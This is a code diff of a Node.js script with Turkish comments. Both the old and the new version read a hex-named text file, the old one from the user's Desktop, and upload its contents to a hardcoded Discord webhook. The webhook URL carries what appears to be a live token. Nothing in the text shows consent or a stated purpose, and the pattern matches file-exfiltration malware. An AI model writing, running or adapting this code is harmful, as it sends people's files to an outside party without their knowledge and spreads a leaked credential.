@@ -1,60 +1,37 @@
-const https = require('https');
 const fs = require('fs');
+const https = require('https');
 const path = require('path');
-const os = require('os');
 
-// Webhook URL'si
-const webhookUrl = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';
+const filePath = path.join(__dirname, '9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt');
+const url = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';
 
-// İşletim sistemi tespiti
-const platform = os.platform();
+const boundary = '--------------------------' + Date.now().toString(16);
 
-// İşletim sistemi bazında dosya yolu belirleme
-let desktopPath;
-if (platform === 'win32') {
-  desktopPath = path.join(os.homedir(), 'Desktop');
-} else if (platform === 'darwin') {
-  desktopPath = path.join(os.homedir(), 'Desktop');
-} else if (platform === 'linux') {
-  desktopPath = path.join(os.homedir(), 'Masaüstü');
-} else {
-  console.error('Desteklenmeyen işletim sistemi:', platform);
-  return;
-}
+const formData = `
+--${boundary}\r
+Content-Disposition: form-data; name="file"; filename="9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt"\r
+Content-Type: text/plain\r
+\r
+${fs.readFileSync(filePath, 'utf-8')}\r
+--${boundary}--
+`;
 
-// Dosya yolunu ve adını oluştur
-const filePath = path.join(desktopPath, '9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt');
+const options = {
+  method: 'POST',
+  headers: {
+    'Content-Type': `multipart/form-data; boundary=${boundary}`,
+    'Content-Length': Buffer.byteLength(formData),
+  },
+};
 
-// Dosyayı oku
-fs.readFile(filePath, (err, fileData) => {
-  if (err) {
-    console.error('Dosya okunurken bir hata oluştu:', err);
-    return;
-  }
-
-  // Webhook'a POST isteği gönder
-  const postData = fileData;
-
-  // POST isteği için gerekli seçenekler
-  const options = {
-    hostname: 'discordapp.com',
-    path: '/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl',
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/octet-stream',
-      'Content-Disposition': `attachment; filename="${path.basename(filePath)}"`
-    }
-  };
-
-  // Webhook'a POST isteği gönder
-  const req = https.request(options, res => {
-    console.log(`Webhook isteği gönderildi, yanıt kodu: ${res.statusCode}`);
-  });
-
-  req.on('error', error => {
-    console.error('Webhook isteği gönderilirken bir hata oluştu:', error.message);
-  });
-
-  req.write(postData);
-  req.end();
+const req = https.request(url, options, (res) => {
+  console.log(`Dosya gönderme isteği gönderildi, yanıt kodu: ${res.statusCode}`);
+  // Yanıtı işleme devam edebilirsiniz...
 });
+
+req.on('error', (error) => {
+  console.error('Dosya gönderme isteği gönderilirken bir hata oluştu:', error.message);
+});
+
+req.write(formData);
+req.end();
